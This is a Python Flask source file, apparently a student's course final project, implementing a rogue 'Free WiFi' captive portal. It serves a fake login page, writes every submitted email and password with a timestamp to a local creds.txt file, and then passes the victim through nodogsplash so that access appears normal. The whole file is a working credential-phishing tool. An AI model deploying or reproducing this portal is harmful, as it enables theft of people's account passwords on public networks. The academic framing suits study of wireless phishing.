#Ishrak Rahman CS492 Final Project Source Code

#Import Flask webserver
#Request - for accessing HTTP request data
#RenderTemplateString - for handling HTML as string
#Redirect - used for URL redirection
from flask import Flask, request, render_template_string, redirect 
import datetime


#Iniatize flask webserver as portalpage
portalpage = Flask(__name__)

#HTML of FreeWifi web page 
loginform = """

<!DOCTYPE html>

<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Free WiFi Login</title>

  <style>

    /*Backgroud and General elements*/
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #00c6ff 0%, #0072ff 100%);
    }

    /*Welcome to Free Wifi Header*/
    .wifiheader {
      background: rgba(255, 255, 255, 0.9);
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
      width: 100%;
      max-width: 400px;
      animation: fadeIn 0.8s ease-out;
    }

    /*Animation*/
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-20px); }
      to { opacity: 1; transform: translateY(0); }
    }


    h1 {
      margin-bottom: 1rem;
      font-size: 1.75rem;
      text-align: center;
      color: #333;
    }

    p {
      margin-bottom: 1.5rem;
      text-align: center;
      color: #555;
    }


    /*Email and Password Sections*/
    form {
      display: flex;
      flex-direction: column;
      gap: 1rem;
    }

    .epsection {
      display: flex;
      flex-direction: column;
    }

    label {
      margin-bottom: 0.5rem;
      font-size: 0.9rem;
      color: #444;
    }

    input[type="email"],
    input[type="password"] {
      padding: 0.5rem;
      font-size: 1rem;
      border: 1px solid #ccc;
      border-radius: 6px;
      transition: border-color 0.3s;
    }

    input[type="email"]:focus,
    input[type="password"]:focus {
      outline: none;
      border-color: #007bff;
      box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.2);
    }

    /*Continue Button*/
    .btn {
      padding: 0.75rem;
      font-size: 1rem;
      font-weight: 600;
      color: #fff;
      background-color: #007bff;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      transition: background-color 0.3s, transform 0.2s;
    }
    .btn:hover {background-color: #0056b3;}
    .btn:active {transform: scale(0.98);}
    .btn:focus {outline: none; box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.5);}

    /*Response from site*/
    @media (max-width: 480px) {
      .container {padding: 1.5rem;}
      h1 {font-size: 1.5rem;}
      .btn {width: 100%;}
    }
    
     .logo {
            font-weight: bold;
            color: #007bff;
            font-size: 20px;
        }



  </style>
</head>
<body>

  <div class="wifiheader">
    <h1>Welcome to Free WiFi</h1>
    <p>Press continue to login.</p>

<!--Tokens and Redirection for Authentication -->
    <form method="POST" action="/login">
      <input type="hidden" name="tok" value="{{ tok }}">
      <input type="hidden" name="redir" value="{{ redir }}">


      <div class="epsection">
        <label for="email">Email address</label>
        <input type="email" id="email" name="email" required>
      </div>


      <div class="epsection">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" required>
      </div>


      <button type="submit" class="btn">Continue</button>

    </form>


     <div class="tagline">Powered by <span class="logo">FreeWifi Inc.</span></div>
    </div>



  </div>
</body>
</html>



"""



@portalpage.route('/') #Homepage route. When user first goes to http://10.10.0.1/ --> with the / route
def showloginform():

    #Get tok and redir from the string in the HTML
    tok = request.args.get('tok', '')
    redir = request.args.get('redir', '')


    #Use render template string to render the page and display while still carrying the token and redirect
    return render_template_string(loginform, tok=tok, redir=redir)


@portalpage.route('/login', methods=["POST"]) #Login route. When user presses login with credentials. 
def capturecreds():
    
    #Extract email from user email input
    e = request.form.get("email")

    #Extract password from user password input
    p = request.form.get("password")


    #Get the tok and the redirect from the page
    tok = request.form.get("tok")
    redir = request.form.get("redir")

    #Get the current date and time
    t = datetime.datetime.now()


    #Write the the user's email and password to a file in which you can view
    with open("creds.txt", "a") as x: #open in append mode

        #log email, password, and timestamp in one line in txt file
        x.write("Email: " + e + " | Password: " + p + " | Timestamp: " + str(t) + "\n")

    
    #Redirect user to another page with token and redir
    return redirect("/authenticate?tok={}&redir={}".format(tok, redir)) #token and redir are placeholders


@portalpage.route('/authenticate') #Once user has authenticated
def auth():

    #Get tok and redir
    tok = request.args.get('tok')
    redir = request.args.get('redir')

    #Redirects back to nodogsplash
    return redirect("http://10.10.0.1:2050/nodogsplash_auth/?tok={}&redir={}".format(tok, redir))

#Running the Flask Web server
if __name__ == "__main__":

    #Run the Flask web server over port 80 on 10.10.0.1 which is the "router" in this project
    portalpage.run(host="10.10.0.1", port=80)

